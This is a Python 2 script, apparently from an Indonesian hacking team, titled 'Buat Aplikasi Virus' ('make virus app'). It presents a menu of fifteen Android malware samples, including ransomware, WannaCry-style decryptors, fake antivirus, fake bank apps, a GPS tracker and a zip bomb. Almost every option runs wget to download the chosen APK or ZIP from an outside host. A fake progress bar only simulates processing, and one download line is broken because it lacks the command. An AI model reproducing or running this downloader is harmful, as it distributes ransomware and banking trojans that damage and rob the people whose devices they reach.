import sys, os, time
B = '\x1b[096m'
K = '\x1b[093m'
G = '\x1b[092m'
H = '\x1b[091m'
P = '\x1b[0m'
W = time.ctime()
try:
    from tqdm import *
except ImportError:
    print G + 'Checking...'
    time.sleep(2)
    print K + 'Install Module..\n' + P
    os.system('pip2 install tqdm')
    print G + '\nInstall Success...'

def Proses():
    for x in tqdm(range(1, 101)):
        time.sleep(0.07)


def cetak():
    teks = K + '\n[Samlekom mamank :V]\n ' + H + 'By: ' + G + '>Muhammad AlFairus - Mr.P3N1S<\n'
    words = teks
    for char in words:
        time.sleep(0.1)
        sys.stdout.write(char)
        sys.stdout.flush()


def menu():
    print B + '_________________________________________' + P
    print '[' + W + ']'
    print H + '#########################################'
    print K + ' Pembuat   : ' + P + 'Muhammad AlFairus'
    print K + ' FORM   : ' + P + 'VIRUS APK'
    print K + ' TEAM   : ' + P + 'Clay Hacker TenarZone'
    print H + '#########################################'
    os.system(" figlet -f digital 'Buat  Aplikasi  Virus' | lolcat")
    print G + '========================================='
    print K + '[' + H + '01' + K + ']' + P + ' AGENTS ' + K + '   [' + H + '02' + K + ']' + P + ' ANDROG ' + K + '   [' + H + '03' + K + ']' + P + ' ANDROR '
    print K + '[' + H + '04' + K + ']' + P + ' ELITEE ' + K + '   [' + H + '05' + K + ']' + P + ' DROIDS ' + K + '   [' + H + '06' + K + ']' + P + ' FAKEAV '
    print K + '[' + H + '07' + K + ']' + P + ' FAKEBK ' + K + '   [' + H + '08' + K + ']' + P + ' GPSPRO ' + K + '   [' + H + '09' + K + ']' + P + ' LEGACY '
    print K + '[' + H + '10' + K + ']' + P + ' PRAMOS ' + K + '   [' + H + '11' + K + ']' + P + ' RANSOM ' + K + '   [' + H + '12' + K + ']' + P + ' WANNA1 '
    print K + '[' + H + '13' + K + ']' + P + ' WANNA2 ' + K + '   [' + H + '14' + K + ']' + P + ' BOMZIP ' + K + '   [' + H + '15' + K + ']' + P + ' ?????? '
    print G + '========================================='
    viruz = raw_input(G + '[' + K + '><' + G + '] ' + P + 'Create No:' + K + ' ')
    if viruz == '1' or viruz == '01':
        satu()
    elif viruz == '2' or viruz == '02':
        dua()
    elif viruz == '3' or viruz == '03':
        tiga()
    elif viruz == '4' or viruz == '04':
        empat()
    elif viruz == '5' or viruz == '05':
        lima()
    elif viruz == '6' or viruz == '06':
        enam()
    elif viruz == '7' or viruz == '07':
        tujuh()
    elif viruz == '8' or viruz == '08':
        lapan()
    elif viruz == '9' or viruz == '09':
        bilan()
    elif viruz == '10':
        puluh()
    elif viruz == '11':
        balas()
    elif viruz == '12':
        wabas()
    elif viruz == '13':
        gabas()
    elif viruz == '14':
        pabas()
    elif viruz == '15':
        mabas()
    else:
        print G + '\n   [!] ' + K + "('_')" + G + ' [!]'
        time.sleep(2)
        os.system('clear')
        menu()


def satu():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/agents.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def dua():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/andrograve.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def tiga():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/androrw.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def empat():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/elite.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def lima():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/droids.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def enam():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/fakeav.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def tujuh():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/fkbank.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def lapan():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/gps.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def bilan():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/legacy.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def puluh():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/pramos.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def balas():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/rans.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def wabas():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/wannadecryptor.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def gabas():
    print G + '\nPleass Wait...' + P
    os.system('http://seni.waper.co/files/wannadecryptorx2.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def pabas():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/bom-zip.zip')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


def mabas():
    print G + '\nPleass Wait...' + P
    os.system('wget http://seni.waper.co/files/rfrfrfr.apk')
    print G + 'Checking...' + K
    Proses()
    time.sleep(2)
    print G + '\nDone\n====' + P
    os.system('ls')
    cetak()
    time.sleep(1)
    sys.exit()


if __name__ == '__main__':
    menu()

